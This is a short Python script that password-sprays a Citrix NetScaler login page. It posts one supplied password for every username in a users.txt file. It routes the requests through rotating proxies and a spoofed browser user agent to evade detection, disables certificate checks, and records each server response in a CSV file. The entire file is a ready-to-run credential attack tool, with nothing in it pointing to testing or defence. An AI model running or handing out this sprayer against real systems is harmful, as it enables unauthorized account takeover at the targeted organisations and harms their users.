#!/usr/bin/env python3
import requests
import sys
import urllib3
import random
import time
import html2text
import csv
import re

urllib3.disable_warnings()

password        = sys.argv[1]

timeout         = 5
user_agent      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36'
headers         = { 'User-Agent' : user_agent }

########################################
# variables to be customized accordingly
########################################
proxy_ips   = [ '200.200.200.100:53128', '200.200.200.200:53128' ]

url         = 'https://citrix.domain.com/nf/auth/doAuthentication.do'
########################################


def rand_proxy():
    if proxy_ips:
        for proxy in random.sample(proxy_ips,len(proxy_ips)):
            return proxy
    else:
        proxy = ''
        return proxy


def browser(username, password, proxy):
        proxies = { 'http' : 'http://' + proxy, 'https' : 'http://' + proxy }
        s       = requests.Session()

        data    = { 'login': username, 'passwd': password, 'savecredentials': 'false', 'nsg-x1-logon-button': 'Log+On', 'StateContext': 'bG9naW5zY2hlbWE9ZGVmYXVsdA==' }
        if proxy:
            req2    = s.post(url, data=data, headers=headers, proxies=proxies, allow_redirects=False, verify=False)
        else:
            req2    = s.post(url, data=data, headers=headers, allow_redirects=False, verify=False)


        with open('results.csv', 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([ url, username, password, proxy, data, req2.status_code,  len(req2.content), req2.headers, req2.url, req2.cookies.get_dict(), req2.text, html2text.html2text(req2.text)])


if __name__== "__main__":

    userfile = open('users.txt', 'r')
    lines = userfile.readlines()

    for line in lines:
        username = line.strip()
        proxy = rand_proxy()
        if proxy:
            print('[-] username: {}, password: {}, proxy: {}'.format(username, password, proxy))
        else:
            print('[-] username: {}, password: {}'.format(username, password))

        browser(username, password, proxy)
        time.sleep(1)

